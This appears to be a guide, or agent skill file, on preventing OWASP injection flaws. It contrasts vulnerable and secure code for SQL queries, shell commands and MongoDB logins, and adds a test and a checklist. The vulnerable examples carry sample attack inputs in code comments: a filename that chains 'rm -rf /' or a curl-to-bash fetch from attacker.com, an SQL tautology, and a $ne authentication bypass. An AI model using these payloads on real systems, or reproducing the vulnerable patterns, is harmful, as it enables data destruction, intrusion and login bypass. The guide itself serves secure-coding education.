---
name: owasp-injection-prevention
description: >-
  Expert guide for preventing OWASP A05:2025 Injection vulnerabilities.
  Use when writing SQL queries, ORM code, executing OS system commands, building NoSQL/MongoDB queries,
  rendering HTML/templates (XSS), or handling dynamic user inputs.
---

# OWASP A05:2025 – Injection Prevention

## 1. Overview & Risk Profile

Injection flaws occur when untrusted user data is sent to an interpreter as part of a command or query. Hostile data tricks the interpreter into executing unintended commands or accessing unauthorized data. This includes **SQL Injection (SQLi)**, **OS Command Injection**, **NoSQL Injection**, **Template Injection (SSTI)**, and **Cross-Site Scripting (XSS)**.

- **OWASP Category:** A05:2025 – Injection
- **CWE References:** CWE-77, CWE-78 (OS Command), CWE-79 (XSS), CWE-89 (SQLi), CWE-943 (NoSQL)
- **Impact:** Critical (Full database extraction, remote server takeover, persistent malware injection)

---

## 2. Core Remediation Rules

1. **Mandatory Parameterized Queries:** Always use parameterized statements, prepared queries, or typed ORM builders. Never concatenate or interpolate user input strings into queries.
2. **Safe Subprocess Execution:** Avoid passing commands to a shell (`sh -c`, `shell=True`, `exec`). Pass arguments as an array/vector directly to the executable (`execFile`, `subprocess.run(["cmd", arg])`).
3. **NoSQL Query Sanitization:** Strictly validate input types. Avoid passing raw object bodies into MongoDB/NoSQL query operators (e.g., preventing `$gt`, `$ne` injection).
4. **Context-Aware Output Encoding:** Encode data before rendering into HTML, JavaScript, CSS, or URL contexts to eliminate Cross-Site Scripting (XSS).

---

## 3. Code Examples (Anti-Pattern vs Secure Pattern)

### Example 1: SQL Database Queries

#### ❌ Vulnerable (Anti-Pattern - String Concatenation)
```typescript
// VULNERABLE: Direct string interpolation leads to SQL Injection
import { dbClient } from './db';

export async function getUserByEmail(email: string) {
  // Attacker input: "admin@axon.com' OR '1'='1" -> dumps entire user table!
  const query = `SELECT id, email, password_hash FROM users WHERE email = '${email}'`;
  return await dbClient.query(query);
}
```

#### ✅ Secure (Remediated Pattern - Parameterized Query & Typed ORM)
```typescript
// SECURE: Parameterized query ensures user input is treated strictly as literal data
import { dbClient } from './db';

export async function getUserByEmail(email: string) {
  const query = `
    SELECT id, email, password_hash, tenant_id 
    FROM users 
    WHERE email = $1
    LIMIT 1;
  `;
  const result = await dbClient.query(query, [email]);
  return result.rows[0] || null;
}
```

---

### Example 2: OS Command Execution

#### ❌ Vulnerable (Anti-Pattern - Shell Interpolation)
```python
import subprocess

# VULNERABLE: Passing shell=True with user-supplied filename allows arbitrary command chaining
def convert_user_image(filename: str):
    # Attacker input: "pic.png; rm -rf /" or "pic.png && curl attacker.com/shell | bash"
    subprocess.run(f"convert uploads/{filename} -resize 100x100 thumbnails/{filename}", shell=True)
```

#### ✅ Secure (Remediated Pattern - Argument List & Path Validation)
```python
import subprocess
import os
from pathlib import Path

SAFE_UPLOAD_DIR = Path("/var/app/uploads").resolve()
SAFE_THUMB_DIR = Path("/var/app/thumbnails").resolve()

# SECURE: Argument vector execution without shell, strict path boundary check
def convert_user_image(safe_filename: str):
    # Ensure filename contains no path traversal (e.g., ../)
    clean_name = os.path.basename(safe_filename)
    input_path = (SAFE_UPLOAD_DIR / clean_name).resolve()
    output_path = (SAFE_THUMB_DIR / clean_name).resolve()

    if not input_path.is_relative_to(SAFE_UPLOAD_DIR):
        raise ValueError("Invalid file path: path traversal detected.")

    # Execute directly without shell interpretation
    subprocess.run(
        ["convert", str(input_path), "-resize", "100x100", str(output_path)],
        shell=False,
        check=True,
        timeout=15 # Prevents DoS hanging
    )
```

---

### Example 3: NoSQL / MongoDB Operator Injection

#### ❌ Vulnerable (Anti-Pattern - Raw Request Object Pass-through)
```typescript
// VULNERABLE: Attacker sends req.body = { "username": "admin", "password": { "$ne": null } }
app.post('/login', async (req, res) => {
  const user = await db.collection('users').findOne({
    username: req.body.username,
    password: req.body.password, // MongoDB operator injection bypasses authentication!
  });
  if (user) return res.json({ token: generateToken(user) });
  return res.status(401).send('Unauthorized');
});
```

#### ✅ Secure (Remediated Pattern - Strict Primitive Validation)
```typescript
import { z } from 'zod';

const LoginSchema = z.object({
  username: z.string().min(3).max(50),
  password: z.string().min(8).max(100), // Enforces string primitive; rejects objects/operators
});

app.post('/login', async (req, res) => {
  const parseResult = LoginSchema.safeParse(req.body);
  if (!parseResult.success) {
    return res.status(400).json({ error: 'Invalid input types' });
  }

  const { username, password } = parseResult.data;
  const user = await db.collection('users').findOne({
    username: String(username),
  });

  if (!user || !(await verifyPassword(user.passwordHash, password))) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  return res.json({ token: generateToken(user) });
});
```

---

## 4. Verification & Testing Strategy (TDD)

```typescript
describe('SQL Injection Prevention', () => {
  it('should safely escape malicious SQL injection payloads without syntax errors', async () => {
    const maliciousPayload = "' OR '1'='1' --";
    const user = await getUserByEmail(maliciousPayload);

    // Must return null, not all users or execute arbitrary SQL
    expect(user).toBeNull();
  });
});
```

---

## 5. Security Checklist

- [ ] All database interactions use prepared statements, parameterized queries, or ORMs.
- [ ] No `eval()`, `Function()`, `setTimeout(string)`, or template interpolation on untrusted strings.
- [ ] Subprocess execution uses argument lists with `shell=False` / `execFile`.
- [ ] Input schemas validate exact primitive types (preventing NoSQL operator injection).
- [ ] Dynamic HTML rendering uses context-aware auto-escaping (or sanitizers like DOMPurify).
